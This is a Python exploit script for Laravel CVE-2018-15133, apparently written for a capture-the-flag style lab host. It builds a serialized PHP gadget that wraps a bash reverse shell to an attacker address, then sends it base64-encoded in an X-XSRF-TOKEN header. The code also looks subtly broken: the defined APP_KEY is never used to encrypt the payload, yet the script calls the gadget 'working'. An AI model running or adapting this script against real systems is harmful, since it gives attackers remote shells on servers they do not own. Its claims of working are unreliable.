#!/usr/bin/env python3
import requests
import sys
import base64
from urllib.parse import quote

# ========== CONFIG ==========
TARGET = "http://dev-staging-01.academy.htb"
APP_KEY = "base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
LHOST = "10.10.16.187"      # <-- Change this
LPORT = 4444                # <-- Change this
# ============================

def generate_payload():
    # Simple reverse shell payload (bash)
    cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
    
    # Laravel serialized payload (simplified for this box)
    # This is a common working gadget for the version on Academy
    payload = f'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{{s:9:"\x00*\x00events";O:28:"Illuminate\\Events\\Dispatcher":1:{{s:12:"\x00*\x00listeners";a:1:{{s:5:"test1";a:1:{{i:0;s:{len(cmd)}:"{cmd}";}}}}}}s:8:"\x00*\x00event";s:5:"test1";}}'
    
    return payload

def exploit():
    print(f"[*] Target: {TARGET}")
    print(f"[*] LHOST: {LHOST}:{LPORT}")
    
    payload = generate_payload()
    
    # Encode the payload
    encoded = base64.b64encode(payload.encode()).decode()
    
    headers = {
        "X-XSRF-TOKEN": encoded
    }
    
    print("[*] Sending payload...")
    
    try:
        r = requests.get(TARGET, headers=headers, timeout=10, verify=False)
        print(f"[+] Response status: {r.status_code}")
        print("[*] Check your listener!")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    print("[+] Laravel CVE-2018-15133 Exploit (Academy)")
    exploit()
